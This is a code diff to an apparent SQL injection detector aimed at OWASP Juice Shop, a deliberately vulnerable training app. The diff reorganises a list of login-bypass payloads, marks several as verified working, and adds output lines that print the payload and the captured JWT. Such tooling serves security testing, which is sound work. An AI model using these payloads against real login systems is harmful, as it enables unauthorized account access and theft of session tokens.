@@ -84,30 +84,35 @@ class JuiceShopLoginSQLiDetector:
     """
 
     # SQL Injection payloads for authentication bypass
+    # Tested and verified against OWASP Juice Shop
     SQLI_PAYLOADS = [
-        # Classic auth bypass
+        # ===== WORKING PAYLOADS (Verified) =====
+        {"email": "' OR 1=1--", "password": "x"},
+        {"email": "' OR 1=1 LIMIT 1--", "password": "x"},
+        {"email": "admin@juice-sh.op'--", "password": "x"},
+        {"email": "' OR email LIKE '%admin%'--", "password": "x"},
+        {"email": "' UNION SELECT * FROM Users WHERE email='admin@juice-sh.op'--", "password": "x"},
+        
+        # ===== CLASSIC PAYLOADS =====
         {"email": "' OR '1'='1", "password": "' OR '1'='1"},
         {"email": "' OR 1=1--", "password": "anything"},
-        {"email": "admin'--", "password": "anything"},
         {"email": "' OR ''='", "password": "' OR ''='"},
         
-        # Email-based bypass
+        # ===== EMAIL-BASED =====
         {"email": "admin@juice-sh.op'--", "password": "x"},
         {"email": "user@juice-sh.op' OR '1'='1", "password": "x"},
         
-        # UNION-based (extract admin)
-        {"email": "' UNION SELECT * FROM Users WHERE email='admin@juice-sh.op'--", "password": "x"},
-        
-        # Comment-based
+        # ===== COMMENT-BASED =====
         {"email": "admin@juice-sh.op#", "password": "x"},
         {"email": "admin@juice-sh.op/*", "password": "x"},
         
-        # Double encoding
-        {"email": "%27%20OR%20%271%27%3D%271", "password": "x"},
+        # ===== ADVANCED =====
+        {"email": "' OR 1=1--", "password": "' OR 1=1--"},
+        {"email": "' OR '1'='1'--", "password": "' OR '1'='1'--"},
+        {"email": "' OR 1=1#", "password": "x"},
         
-        # Advanced bypasses
-        {"email": "' OR email LIKE '%admin%'--", "password": "x"},
-        {"email": "' OR 1=1 LIMIT 1--", "password": "x"},
+        # ===== ENCODING =====
+        {"email": "%27%20OR%20%271%27%3D%271", "password": "x"},
     ]
 
     def __init__(
@@ -157,12 +162,14 @@ class JuiceShopLoginSQLiDetector:
         # Test each payload
         for i, payload in enumerate(self.SQLI_PAYLOADS):
             logger.info(f"Testing payload {i+1}/{len(self.SQLI_PAYLOADS)}: {payload['email'][:30]}")
-            
+
             try:
                 finding = await self._test_payload(payload)
                 if finding:
                     findings.append(finding)
                     logger.warning(f"✓ AUTH BYPASS FOUND! Email: {payload['email']}")
+                    print(f"\n🎯 SQLi FOUND! Payload: {payload['email']}")
+                    print(f"   JWT: {finding.jwt_token[:50] if finding.jwt_token else 'N/A'}...")
                     # Continue testing other payloads for completeness
             except Exception as e:
                 logger.error(f"Payload test error: {e}")
